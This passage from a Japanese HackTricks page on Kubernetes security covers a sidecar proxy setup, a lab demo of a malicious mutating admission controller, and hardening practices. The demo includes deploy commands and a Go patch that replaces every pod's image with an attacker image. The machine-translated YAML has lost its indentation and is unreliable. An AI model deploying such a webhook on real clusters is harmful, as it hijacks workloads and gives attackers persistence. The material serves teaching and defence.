
デフォルトでは、ポッド間の通信には暗号化がありません。相互認証、双方向、ポッド間の通信にはありません。

#### サイドカープロキシアプリの作成 <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

あなたの.yamlファイルを作成してください。
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
あなたの .yaml ファイルを編集し、コメントアウトされた行を追加してください。
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
プロキシのログを参照してください：
```bash
kubectl logs app -C proxy
```
詳細はこちらを参照してください：[https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### 悪意のあるアドミッションコントローラ

アドミッションコントローラは、オブジェクトの永続化の前にKubernetes APIサーバーへのリクエストをインターセプトするコードの一部ですが、リクエストが認証された後であり、承認された後です。

攻撃者が何らかの方法で「Mutationg Adminssion Controller」を注入できれば、既に認証されたリクエストを変更することができます。これにより、特権昇格やクラスター内での永続化などが可能になります。

例：[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
待ってください。Webhookサーバーが準備完了するまでお待ちください。ステータスを確認してください：
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

悪意のある変異ウェブフックが実行されている場合、新しいポッドを展開しましょう。
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
待って、ポッドのステータスが変わるのを確認するまで再度お待ちください。今、`ErrImagePull` エラーが表示されるはずです。どちらかのクエリでイメージ名を確認してください。
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

上の画像で見るように、私たちは`nginx`イメージを実行しようとしましたが、最終的に実行されたイメージは`rewanthtammana/malicious-image`です。何が起こったのでしょうか！？

#### 技術的な詳細 <a href="#heading-technicalities" id="heading-technicalities"></a>

起こったことを解明します。実行した`./deploy.sh`スクリプトは、ミューテーションウェブフックアドミッションコントローラを作成しました。以下の行は、上記の結果に責任があります。
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
上記のスニペットでは、すべてのポッドの最初のコンテナイメージを `rewanthtammana/malicious-image` に置き換えます。

## ベストプラクティス

### **ポッドでのサービスアカウントトークンの自動マウントを防止する**

ポッドが作成されると、デフォルトのサービスアカウント（同じ名前空間のデフォルトサービスアカウント）が自動的にマウントされます。すべてのポッドが自身内部からAPIを利用する必要はありません。

バージョン1.6以降では、automountServiceAccountToken: false を使用して、ポッドでのサービスアカウントトークンの自動マウントを防止することが可能です。これはサービスアカウントまたはポッドで使用することができます。

サービスアカウントに追加する場合は、次のように追加する必要があります:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

また、ポッドでも使用することができます:\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **特定のユーザーにRoleBindings\ClusterRoleBindingsを付与する**

RoleBindings\ClusterRoleBindingsを作成する際には、バインディング内で役割が必要なユーザーのみが含まれていることを確認してください。このようなグループに関係のないユーザーを忘れることがあります。

### **ClusterRolesとClusterRoleBindingsの代わりにRolesとRoleBindingsを使用する**

ClusterRolesとClusterRoleBindingsを使用すると、それらはクラスタ全体に適用されます。このようなグループのユーザーは、すべての名前空間に対して権限を持ちますが、これは必要ない場合もあります。RolesとRoleBindingsは特定の名前空間に適用することができ、セキュリティの別のレイヤーを提供します。

### **自動化ツールの使用**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **参考文献**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}

***

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
